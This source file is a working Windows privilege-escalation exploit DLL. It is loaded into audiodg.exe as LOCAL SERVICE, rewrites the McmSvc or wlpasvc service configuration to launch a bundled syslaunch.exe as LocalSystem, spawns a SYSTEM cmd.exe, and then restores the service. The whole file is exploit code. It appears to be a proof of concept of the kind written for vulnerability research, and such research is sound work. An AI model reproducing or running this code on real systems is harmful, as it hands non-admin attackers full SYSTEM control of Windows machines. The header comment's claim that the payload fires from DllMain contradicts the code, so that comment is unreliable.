// proof.dll  --  v3 payload: non-admin -> LOCAL SERVICE -> SYSTEM, popping a VISIBLE SYSTEM cmd.exe.
//
// Loaded by audiodg.exe (NT AUTHORITY\LOCAL SERVICE, SeImpersonate) via the spatial-audio store-plugin
// loader (zero-admin foothold). McmSvc/wlpasvc grant S-1-5-19 SERVICE_CHANGE_CONFIG, so from here we
// reconfigure McmSvc to run our SYSTEM-side launcher (syslaunch.exe, shipped next to this DLL in the
// package) as LocalSystem, then StartService. syslaunch, running as SYSTEM in session 0, spawns cmd.exe
// into the interactive console session -> a real SYSTEM window on screen.
//
// The escalation fires from BOTH DllMain AND the exported DllGetActivationFactory (audiodg calls the
// latter on every codec instantiation, independent of DLL load refcount) so the SYSTEM shell pops on
// EVERY run even when this DLL is already resident in a long-lived audiodg. A cooldown collapses the
// burst of DGAF calls within a single run to exactly one escalation. All work is on a worker thread so
// audiodg's codec path is never blocked. McmSvc is restored to its stock config after each run.
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <sddl.h>
#include <stdio.h>
#include <stdlib.h>

static const wchar_t* LOGP = L"C:\\Users\\Public\\svc_escalate_dll.log";
static char g_binPath[1200];   // "<packagedir>\syslaunch.exe"  (quoted)

static void L(const char* fmt, ...) {
    char b[2048]; int n; va_list ap; va_start(ap, fmt);
    n = _vsnprintf_s(b, sizeof(b), _TRUNCATE, fmt, ap); va_end(ap);
    if (n < 0) n = (int)strlen(b);
    HANDLE h = CreateFileW(LOGP, FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h != INVALID_HANDLE_VALUE) { DWORD w = 0; WriteFile(h, b, (DWORD)n, &w, NULL); WriteFile(h, "\r\n", 2, &w, NULL); CloseHandle(h); }
}

typedef struct { const char* name; DWORD type; DWORD start; const char* bin; const char* deps; const char* acct; } SvcGood;
static const char MCM_DEPS[]  = "wlpasvc\0wwansvc\0";
static const char WLPA_DEPS[] = "WwanSvc\0RpcSs\0";
static const SvcGood GOODS[] = {
  { "McmSvc",  SERVICE_WIN32_OWN_PROCESS,   SERVICE_DEMAND_START, "C:\\WINDOWS\\system32\\svchost.exe -k McmSvc -p -s McmSvc", MCM_DEPS,  "NT SERVICE\\McmSvc" },
  { "wlpasvc", SERVICE_WIN32_SHARE_PROCESS, SERVICE_DEMAND_START, "C:\\WINDOWS\\system32\\svchost.exe -k LocalServiceNetworkRestricted -p", WLPA_DEPS, "NT Authority\\LocalService" },
};
static const SvcGood* good_for(const char* n){ for(size_t i=0;i<sizeof(GOODS)/sizeof(GOODS[0]);i++) if(!_stricmp(GOODS[i].name,n)) return &GOODS[i]; return NULL; }

static void compute_binpath(void) {
    HMODULE hm = NULL; wchar_t wpath[MAX_PATH] = {0};
    GetModuleHandleExW(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
                       (LPCWSTR)&compute_binpath, &hm);
    GetModuleFileNameW(hm, wpath, MAX_PATH);                       // ...\CodecHostPoc_...\proof.dll
    wchar_t* slash = wcsrchr(wpath, L'\\'); if (slash) *(slash+1) = 0;
    wchar_t wexe[MAX_PATH]; _snwprintf_s(wexe, _countof(wexe), _TRUNCATE, L"%ssyslaunch.exe", wpath);
    char narrow[1024] = {0}; WideCharToMultiByte(CP_ACP, 0, wexe, -1, narrow, sizeof(narrow), NULL, NULL);
    _snprintf_s(g_binPath, sizeof(g_binPath), _TRUNCATE, "\"%s\"", narrow);   // quote (Program Files has a space)
    L("[*] launcher binPath = %s", g_binPath);
}

static void write_whoami(const char* entry) {
    // LOCAL SERVICE token dump for the launcher's marker check + per-run consistency TICK.
    char buf[2048]; int off = 0;
    wchar_t img[MAX_PATH] = {0}; GetModuleFileNameW(NULL, img, MAX_PATH);
    off += _snprintf_s(buf+off, sizeof(buf)-off, _TRUNCATE, "IMAGE: %ws\r\nPID: %lu\r\nENTRY: %s\r\nTICK: %llu\r\n",
                       img, GetCurrentProcessId(), entry, (unsigned long long)GetTickCount64());
    HANDLE t=NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &t)) {
        DWORD len=0; GetTokenInformation(t, TokenUser, NULL, 0, &len);
        BYTE* tu=(BYTE*)LocalAlloc(LPTR, len?len:16);
        if (tu && GetTokenInformation(t, TokenUser, tu, len, &len)) {
            LPWSTR s=NULL; ConvertSidToStringSidW(((TOKEN_USER*)tu)->User.Sid,&s);
            const wchar_t* well = (s && !lstrcmpW(s,L"S-1-5-19")) ? L"NT AUTHORITY\\LOCAL SERVICE"
                                : (s && !lstrcmpW(s,L"S-1-5-18")) ? L"NT AUTHORITY\\SYSTEM" : L"(other)";
            off += _snprintf_s(buf+off, sizeof(buf)-off, _TRUNCATE, "TOKEN_USER_SID: %ws => %ws\r\n", s?s:L"?", well);
            if (s) LocalFree(s);
        }
        if (tu) LocalFree(tu);
        CloseHandle(t);
    }
    HANDLE h=CreateFileW(L"C:\\Users\\Public\\audiodg_pwn_whoami.txt", GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, 0, NULL);
    if (h!=INVALID_HANDLE_VALUE){ DWORD w=0; WriteFile(h, buf, off, &w, NULL); CloseHandle(h); }
}

static void dump_identity(void) {
    HANDLE t = NULL; if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &t)) return;
    DWORD len = 0; GetTokenInformation(t, TokenUser, NULL, 0, &len);
    BYTE* tu = (BYTE*)LocalAlloc(LPTR, len ? len : 16);
    if (tu && GetTokenInformation(t, TokenUser, tu, len, &len)) { LPWSTR s=NULL; ConvertSidToStringSidW(((TOKEN_USER*)tu)->User.Sid,&s); L("[id] token user SID: %ws", s?s:L"?"); if(s) LocalFree(s); }
    if (tu) LocalFree(tu);
    L("[id] IsTokenRestricted = %s", IsTokenRestricted(t) ? "TRUE" : "FALSE");
    CloseHandle(t);
}

static void restore_known_good(SC_HANDLE svc, const char* name) {
    const SvcGood* g = good_for(name); if (!g) return;
    BOOL r = ChangeServiceConfigA(svc, g->type, g->start, SERVICE_ERROR_NORMAL, g->bin, NULL, NULL, g->deps, g->acct, NULL, NULL);
    L("[*] restore %s to stock config: %s (err=%lu)", name, r ? "OK" : "FAILED", r ? 0 : GetLastError());
}

static int escalate_via_service(const char* svcName) {
    L(""); L("==== target service: %s ====", svcName);
    SC_HANDLE scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
    if (!scm) { L("[-] OpenSCManager failed %lu", GetLastError()); return 0; }

    SC_HANDLE probe = OpenServiceA(scm, svcName, SERVICE_CHANGE_CONFIG);
    if (!probe) { DWORD e=GetLastError(); L("[-] PROBE OpenService(%s, CHANGE_CONFIG) DENIED err=%lu", svcName, e); CloseServiceHandle(scm); return 0; }
    L("[+] PROBE OpenService(%s, SERVICE_CHANGE_CONFIG) GRANTED", svcName);
    CloseServiceHandle(probe);

    SC_HANDLE svc = OpenServiceA(scm, svcName, SERVICE_CHANGE_CONFIG|SERVICE_START|SERVICE_STOP|SERVICE_QUERY_STATUS);
    if (!svc) { L("[-] OpenService(full) failed %lu", GetLastError()); CloseServiceHandle(scm); return 0; }

    SERVICE_STATUS ss; ZeroMemory(&ss,sizeof(ss));
    if (ControlService(svc, SERVICE_CONTROL_STOP, &ss)) { L("[*] stop requested"); Sleep(1200); }
    else L("[*] stop: err=%lu (already stopped)", GetLastError());

    DeleteFileW(L"C:\\Users\\Public\\syslaunch.log");

    BOOL chg = ChangeServiceConfigA(svc, SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
                                    g_binPath, NULL, NULL, "\0", "LocalSystem", NULL, NULL);
    if (!chg) { L("[-] ChangeServiceConfig FAILED err=%lu", GetLastError()); restore_known_good(svc,svcName); CloseServiceHandle(svc); CloseServiceHandle(scm); return 0; }
    L("[+] ChangeServiceConfig OK: binPath=syslaunch.exe, account=LocalSystem, deps cleared");

    BOOL st = StartServiceA(svc, 0, NULL);
    L("[*] StartService ret=%d err=%lu (1053/1064 expected)", st, GetLastError());

    for (int i=0;i<30;i++){ if (GetFileAttributesW(L"C:\\Users\\Public\\syslaunch.log")!=INVALID_FILE_ATTRIBUTES) { Sleep(400); break; } Sleep(100); }

    restore_known_good(svc, svcName);
    CloseServiceHandle(svc); CloseServiceHandle(scm);

    int win = 0;
    HANDLE lf = CreateFileW(L"C:\\Users\\Public\\syslaunch.log", GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (lf != INVALID_HANDLE_VALUE) {
        char b[2048]; DWORD r=0; if (ReadFile(lf,b,sizeof(b)-1,&r,NULL)) { b[r]=0; L("[+] syslaunch.log:"); char* c=NULL; char* ln=strtok_s(b,"\r\n",&c); while(ln){ L("    %s",ln); if(strstr(ln,"spawned SYSTEM cmd")) win=1; ln=strtok_s(NULL,"\r\n",&c);} }
        CloseHandle(lf);
    } else L("[-] no syslaunch.log (launcher did not run)");
    L("==== %s result: %s ====", svcName, win?"*** SYSTEM cmd SPAWNED ***":"launcher ran but no spawn confirmed");
    return win;
}

static volatile LONG g_busy = 0;
static ULONGLONG g_lastFire = 0;

static DWORD WINAPI worker(LPVOID p) {
    const char* entry = (const char*)p;
    L("======== svc_escalate (pop-cmd) payload fired [%s] ========", entry);
    wchar_t img[MAX_PATH]={0}; GetModuleFileNameW(NULL,img,MAX_PATH);
    L("[*] host image: %ws  PID=%lu", img, GetCurrentProcessId());
    dump_identity();
    compute_binpath();

    int got = escalate_via_service("McmSvc");
    if (!got) got = escalate_via_service("wlpasvc");

    write_whoami(entry);
    CreateDirectoryW(L"C:\\Users\\Public\\audiodg_pwn", NULL);
    HANDLE ev = CreateEventW(NULL, TRUE, TRUE, L"Global\\audiodg_pwn"); (void)ev;
    L(got ? "######## OVERALL: SYSTEM cmd popped via non-admin chain ########"
          : "######## OVERALL: reached LocalService but no SYSTEM cmd ########");
    InterlockedExchange(&g_busy, 0);
    return 0;
}

// Fire at most once per run. We drive the escalation ONLY from DllGetActivationFactory (audiodg
// calls it on every codec instantiation, on both fresh and resident loads), so exactly one source
// triggers it. The busy flag + cooldown collapse the burst of DGAF calls within a single run to one
// escalation; the cooldown is longer than a worker's runtime so a late DGAF in the same run can't
// re-fire, while consecutive exe runs (seconds apart) each fire.
static void maybeFire(const char* entry) {
    if (InterlockedCompareExchange(&g_busy, 1, 0) != 0) return;         // a worker is already running
    ULONGLONG now = GetTickCount64();
    if (g_lastFire != 0 && (now - g_lastFire) < 6000) { InterlockedExchange(&g_busy, 0); return; } // cooldown
    g_lastFire = now;
    CreateThread(NULL, 0, worker, (LPVOID)entry, 0, NULL);
}

// audiodg calls this on every codec instantiation -> re-fires the escalation on every run.
extern "C" __declspec(dllexport) HRESULT __stdcall
DllGetActivationFactory(void* /*activatableClassId*/, void** factory) {
    if (factory) *factory = NULL;
    maybeFire("DllGetActivationFactory");
    return (HRESULT)0x80004002; // E_NOINTERFACE
}

BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID r) {
    (void)r;
    if (reason == DLL_PROCESS_ATTACH) DisableThreadLibraryCalls(h);   // escalation fires from DGAF only
    return TRUE;
}
